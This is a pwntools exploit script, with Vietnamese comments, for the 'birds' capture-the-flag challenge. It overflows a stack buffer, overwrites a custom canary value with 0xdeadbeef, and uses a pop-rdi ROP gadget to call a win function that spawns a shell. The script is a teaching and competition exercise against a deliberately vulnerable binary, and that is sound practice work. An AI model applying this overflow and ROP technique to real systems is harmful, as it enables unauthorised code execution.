from pwn import *

p = process('./birds')
#p = remote("tjc.tf", 31625)

win_addr =  0x00000000004011c4 # Kiểm tra trong IDA hoặc dùng tool trên linux như nm, objdump,...
win_addr_no_check = 0x00000000004011DC
pop_rdi = 0x00000000004011c0 # pop rdi ; nop ; pop rbp ; ret

# Checksec khong thay canary duoc bat => custom canary check trong IDA

# De vuot qua check dau thi can lam tran bien v4, khi tran sang v5 thi cho no gia tri la 0xdeadbeef

payload = b'A'*76 # bof
payload += p32(0xdeadbeef) # Can su dung 4 byte de ghi chinh xac gia tri cua v5 nen ta se dung p32()
						   # Neu dung p64() se ghi 8 byte => ko vuot qua check
payload += b'B'*8 # pad RBP

### Cách 1: Truyền giá trị vào secret để vượt qua check ###
# Ham win can dua a1 vao, checksec khong co PIE => tim pop rdi bang ROPgadget sau do dua a1(=0xA1B2C3D4) vao

payload += p64(pop_rdi)
payload += p64(0xA1B2C3D4) # RDI dung p64 de truyen a1 vao, do rdi la thanh ghi 64bit nen dung p64()
payload += p64(0) # RBP, khong su dung den pad them vao do cac gadget la pop rdi ; nop ; pop rbp ; ret
payload += p64(win_addr) # Nhay vao win

### Cách 2: Nhảy thẳng vào vùng nhớ thực thi /bin/sh ###
#payload += p64(win_addr_no_check) # Nhảy thẳng vào vùng nhớ thực hiện if

#input()
p.sendlineafter(b'I made a canary to stop buffer overflows. Prove me wrong!\n', payload)
#input()

p.interactive() # Vào interactive thì chạy lệnh để kiểm tra thôi